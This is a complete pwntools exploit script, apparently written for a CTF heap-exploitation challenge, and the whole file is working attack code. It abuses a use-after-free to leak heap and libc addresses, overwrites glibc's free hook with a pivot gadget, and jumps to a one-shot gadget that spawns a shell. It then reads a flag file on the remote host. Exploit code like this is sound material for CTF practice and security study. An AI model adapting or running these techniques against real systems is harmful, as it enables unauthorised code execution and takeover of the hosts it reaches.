from pwn import *
from struct import *
from time import *
import argparse

b = ELF('chall')
context.log_level = 'info'
context.arch = 'amd64'

main_arena_offset = 0x399b00
free_hook_offset = 0x39b788
gadget_pivot_from_rdi = 0x00000000000f5390 # mov rdx, qword ptr [rdi + 8] ; mov rax, qword ptr [rdi] ; mov rdi, rdx ; jmp rax
gadget_xor_eax_eax_jmp_rdx = 0x000000000010be3f # xor eax, eax ; pop rbx ; pop rbp ; jmp rdx
magic_gadget_eax_0 = 0x3f306 # need eax to 0 for this magic gadget

def exploit():

    def recv_to_prompt(p=False):
        if p:
            print r.recvuntil(">> ", timeout=1)
        else:
            r.recvuntil(">> ", timeout=1)

    def createMessage(panel, len, message):
        r.send("1"+"\n")
        recv_to_prompt()
        r.send(panel + "\n")
        recv_to_prompt()
        r.send(len + "\n")
        recv_to_prompt()
        r.send(message + "\n")
        recv_to_prompt()

    def editMessage(panel, message):
        r.send("2"+"\n")
        recv_to_prompt()
        r.send(panel + "\n")
        recv_to_prompt()
        r.send(message + "\n")
        recv_to_prompt()

    def listMessages():
        r.send("4" + "\n")
        recv_to_prompt()

    def deleteMessage(panel):
        r.send("3" + "\n")
        recv_to_prompt()
        r.send(panel + "\n")
        recv_to_prompt()

    def leak_at(string):
        r.recvuntil(string)
        leak = r.recvuntil("]")[:-1]
        leak += (8 - len(leak)) * "\x00"
        leak = unpack("<Q", leak)
        recv_to_prompt()
        return leak[0]

    parser = argparse.ArgumentParser()
    parser.add_argument('host', metavar='host', type=str)

    args = parser.parse_args()

    r = connect(args.host, 2323)

    recv_to_prompt()

    print "[+] Massaging heap..."
    createMessage("0", "50" ,  "A" * 40)
    createMessage("1", "50",  "B" * 40)
    createMessage("2", "256", "C" * 40)
    createMessage("3", "256",  "D" * 40)
    createMessage("4", "256", "E" * 40)

    print "[+] Triggering delete bug"
    deleteMessage("1")
    deleteMessage("2")
    deleteMessage("4")
    deleteMessage("3")

    print "[+] Leaking fastchunk address using UAF..."
    r.send("4" + "\n")
    fastchunk = leak_at("[03][") + 0x10

    if len(str(fastchunk)) < 4:
        print "[-] Something went wrong, try again !"
        r.close()
        return 0

    print "[+] Leaking main_arena using UAF..."
    createMessage("1", "32", "BBBBCCCC" + pack("<Q", fastchunk))

    r.send("4" + "\n")
    main_arena = leak_at("[04][") - 88

    print "[+] main_arena is at 0x%X !"  % main_arena
    libcbase = main_arena - main_arena_offset

    if len(str(main_arena)) < 4:
        print "[-] Something went wrong, try again !"
        r.close()
        return 0

    print "[+] Rewriting free hook with pivot..."
    editMessage("1", "BBBBCCCC" + pack("<Q", libcbase + free_hook_offset))

    createMessage("2", "256", "C" * 40)
    createMessage("3", "256",  "D" * 40)
    createMessage("5", "256",  "D" * 40)

    editMessage("4", pack("<Q", libcbase + gadget_pivot_from_rdi))


    createMessage("7", "256", pack("<Q", libcbase + gadget_xor_eax_eax_jmp_rdx) + pack("<Q", libcbase + magic_gadget_eax_0) + pack("<Q", 0xDEADBEEF) )
    createMessage("8", "256" ,  "W"*50)
    createMessage("9", "256" ,  "Z"*50)

    print "[+] Jumping on pivot and magid gadget ! Enjoy your shell !"

    deleteMessage("7")

    r.sendline('cat /home/chall/flag.txt')
    r.interactive()

    return 1

if __name__ == "__main__":
    exploit()
